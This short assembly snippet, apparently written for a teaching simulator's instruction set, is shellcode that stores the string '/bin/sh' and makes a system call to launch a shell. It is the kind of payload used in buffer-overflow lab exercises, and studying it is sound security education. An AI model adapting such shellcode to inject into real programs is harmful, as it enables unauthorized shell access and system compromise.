excute:

gpc $2, r0
br run

.long 0x2f62696e
.long 0x2f73680a

run:
ld $7, r1
 sys $2

halt

